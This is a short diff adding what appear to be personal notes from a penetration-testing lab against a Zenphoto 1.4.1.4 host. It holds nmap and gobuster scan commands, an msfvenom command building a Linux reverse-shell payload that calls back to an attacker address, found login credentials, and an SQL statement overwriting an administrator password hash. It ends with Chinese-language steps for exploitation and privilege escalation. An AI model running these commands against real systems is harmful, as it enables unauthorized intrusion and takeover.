@@ -1,0 +1,30 @@
+nmap -sV -sC -Pn 192.168.55.41 > nmap.txt
+nmap -p- 192.168.55.41 > nmapall.txt
+
+
+msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.49.55 LPORT=4444 -f elf-so > timmy.so                                                                                                                2 ⨯
+
+
+
+gobuster dir  -u http://192.168.55.41/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+gobuster dir  -u http://192.168.55.41/test/  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobustertest.txt
+
+
+        define("CONFIG_LOGIN_USERNAME", 'ajax');
+        define('CONFIG_LOGIN_PASSWORD', '123456');
+
+
+
+-rwsr-sr-x 1 root root 9664 Apr  8  2010 /usr/bin/X
+-rw-r--r--  1 root root 4.4K Nov  9  2011 zp-config.php
+
+
+
+
+UPDATE zp_administrators SET pass="cb88945e9d64c16a44cb4cf567b2b6a211e9dce2" WHERE ID=7;
+1.nmap掃描出80端口
+2.gobuster查找到test路徑是zenphoto服務
+3.查找到是1.4.1.4版本
+4.根據版本號找到exploit
+5.取得reverse shell後上傳linux-exploit-suggester
+6.根據suggester結果找到rds提權
